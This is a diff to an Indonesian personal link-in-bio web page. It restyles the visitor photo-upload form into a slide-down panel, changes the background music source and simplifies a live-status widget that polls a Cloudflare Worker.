@@ -67,7 +67,20 @@
     #igStatus{position:fixed;bottom:12px;left:14px;background:rgba(255,255,255,0.08);color:#c5c5c5;font-size:13px;border-radius:8px;padding:6px 10px;z-index:99999;font-family:monospace;cursor:pointer;display:none}
     @media(max-width:520px){.head{flex-direction:row;gap:12px}.avatar img{width:68px;height:68px}}
 
-    /* === ANIMASI 📨 BERKEDIP DAN GESER === */
+    /* === Animasi slide-down untuk kirim foto === */
+    .slidebox {
+      max-height: 0;
+      overflow: hidden;
+      opacity: 0;
+      transition: all 0.4s ease;
+    }
+    .slidebox.show {
+      max-height: 500px;
+      opacity: 1;
+      margin-top: 10px;
+    }
+
+    /* === Animasi 📨 BERKEDIP === */
     @keyframes mailBlink {
       0% { opacity: 0; transform: translateX(0); }
       25% { opacity: 1; transform: translateX(6px); }
@@ -112,26 +125,42 @@
       </div>
 
       <div class="btns">
-        <a class="btn" href="https://www.tiktok.com/@koplingterus" target="_blank">📱 TikTok</a>
+        <a class="btn" href="https://www.tiktok.com/@koplingterus" target="_blank">📱 Tiktok</a>
         <a class="btn" href="https://open.spotify.com/user/31ekkvvirtytc24a46swumscuv3e" target="_blank">🎸 Spotify</a>
         <a class="btn" href="https://www.instagram.com/im4mdv" target="_blank">📸 Instagram</a>
         <button class="btn" id="openAsk">📬 Pertanyaan/Question</button>
       </div>
 
+      <!-- ==== BAGIAN KIRIM FOTO BARU ==== -->
       <div class="music">
         <h3>🖼️ Kirim foto?</h3>
         <p class="note">Unggah foto yang akan dikirim 📨</p>
-        <button class="btn" id="takePhoto" style="margin-bottom:8px;">📸 Ambil Foto</button>
-        <input type="file" id="photoInput" accept="image/*">
+        <button class="btn" id="openPhotoOptions">😿 Kirim foto disini</button>
+
+        <div id="photoOptions" class="slidebox">
+          <button class="btn" id="takePhoto">📸 Ambil Foto</button>
+          <input type="file" id="photoInput" accept="image/*" style="margin-top:6px;">
+          <textarea id="caption" rows="2" placeholder="Tulis pesan ya!" style="margin-top:8px;"></textarea>
+          <button class="btn" id="sendPhoto" style="margin-top:8px;">📨 Kirim Foto</button>
+          <div id="status" class="note"></div>
+        </div>
+
         <img id="photoPreview" style="display:none;margin-top:10px;width:100%;border-radius:8px;">
-        <textarea id="caption" rows="2" placeholder="Tulis pesan ya!"></textarea>
-        <button class="btn" id="sendPhoto" style="margin-top:8px;">📨 Kirim Foto</button>
-        <div id="status" class="note"></div>
       </div>
+      <!-- ==== END KIRIM FOTO ==== -->
 
       <div class="footer">stay calm</div>
     </div>
   </div>
+
+  <!-- script lain tetap sama -->
+  <script>
+    const openPhotoOptions = document.getElementById('openPhotoOptions');
+    const photoOptions = document.getElementById('photoOptions');
+    openPhotoOptions.addEventListener('click', () => {
+      photoOptions.classList.toggle('show');
+    });
+  </script>
 
   <div class="modal" id="modal">
     <div class="panel">
@@ -155,7 +184,7 @@
   </div>
 
   <div id="igStatus"></div>
-  <audio id="bgmusic" src="https://hipstrumentals.com/wp-content/uploads/2025/07/Lil-Peep-Ft.-rainy-bear-nuts-Instrumental-Prod.-By-Willie-G.mp3" preload="auto" muted></audio>
+  <audio id="bgmusic" src="https://files.catbox.moe/zf650e.mp3" preload="auto" muted></audio>
 
   <script>
   // NOTE: replace the two placeholders below with your actual bot token and chat id
@@ -352,90 +381,70 @@
     area.addEventListener('touchcancel', endHold);
   })();
   </script>
-<!-- === Live Mode Status (Smooth Fade Aura Glow + Safe Insert Fix) === -->
+<!-- === Live Mode Status (Light Fade-Up Version) === -->
 <script>
 (async function(){
-  // Cari elemen yang mengandung teks "Sharing vibes & question"
   const titleEl = [...document.querySelectorAll('*')]
     .find(e => /sharing vibes & question/i.test(e.textContent));
   if(!titleEl) return;
-
-  // Tentukan tempat penyisipan yang aman (hindari <html> / <body>)
   const parentEl = titleEl.parentElement || document.body;
 
-  // Buat elemen status baru
   const statusBox = document.createElement("div");
   statusBox.id = "liveModeStatus";
   statusBox.style.cssText = `
-    margin-top:8px;
+    width:100%;
+    display:block;
     text-align:center;
     font-size:14px;
     font-family:'Poppins', monospace;
     color:#cfcfcf;
     opacity:0;
-    transition:opacity 1s ease, text-shadow 1s ease, color 1s ease;
-    letter-spacing:0.5px;
+    transform:translateY(6px);
+    transition:opacity .6s ease, transform .6s ease, color .6s ease;
+    margin-top:6px;
+    margin-bottom:4px;
+    letter-spacing:0.4px;
     user-select:none;
+    position:relative;
   `;
 
-  // Sisipkan di bawah teks target
-  if (["HTML","BODY"].includes(titleEl.tagName)) {
-    parentEl.appendChild(statusBox);
-  } else {
-    titleEl.insertAdjacentElement("afterend", statusBox);
-  }
+  const musicBtn = parentEl.querySelector("#musicButton");
+  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
+  else titleEl.insertAdjacentElement("afterend", statusBox);
 
-  // Tambahkan animasi aura glow
-  const style = document.createElement("style");
-  style.textContent = `
-  @keyframes auraGlow {
-    0% { text-shadow: 0 0 6px rgba(255,255,255,0.3), 0 0 12px rgba(255,255,255,0.1); }
-    50% { text-shadow: 0 0 18px rgba(255,255,255,0.7), 0 0 30px rgba(255,255,255,0.4); }
-    100% { text-shadow: 0 0 8px rgba(255,255,255,0.4), 0 0 16px rgba(255,255,255,0.2); }
-  }
-  #liveModeStatus.active {
-    animation: auraGlow 3s infinite ease-in-out;
-  }`;
-  document.head.appendChild(style);
-
-  // Fungsi ambil status dari Cloudflare Worker
   async function updateStatus(){
     try {
       const res = await fetch("https://sybau.imamadevera.workers.dev/status", {cache:"no-store"});
       const data = await res.json();
       const time = new Date(data.time);
       const diff = (Date.now() - time.getTime()) / 60000;
-      const ago = diff < 1 ? "baru saja" : `${Math.floor(diff)}m ago`;
-
+      const ago = diff < 1 ? "Music" : `${Math.floor(diff)}m ago`;
       const text = `${data.status} (${ago})`;
 
-      // Smooth transition setiap status berubah
       if (statusBox.textContent !== text) {
         statusBox.style.opacity = 0;
+        statusBox.style.transform = "translateY(6px)";
         setTimeout(() => {
           statusBox.textContent = text;
           statusBox.style.opacity = 1;
-          statusBox.classList.add("active");
-
-          // Warna sesuai status
+          statusBox.style.transform = "translateY(0)";
           let color = "#fff";
           if (data.status.includes("Online")) color = "#00ffb3";
           else if (data.status.includes("Listening")) color = "#4cc9ff";
           else if (data.status.includes("Offline")) color = "#ff7ca3";
           statusBox.style.color = color;
-          statusBox.style.textShadow = `0 0 12px ${color}, 0 0 24px ${color}`;
-        }, 300);
+        }, 200);
       }
     } catch {
       statusBox.textContent = "⚠️ gagal memuat status";
       statusBox.style.color = "#ff7979";
       statusBox.style.opacity = 1;
+      statusBox.style.transform = "translateY(0)";
     }
   }
 
-  // Jalankan pertama kali & refresh setiap 6 detik
   updateStatus();
-  setInterval(updateStatus, 6000);
+  setInterval(updateStatus, 4000); // refresh tiap 8 detik biar lebih ringan
 })();
 </script>
 
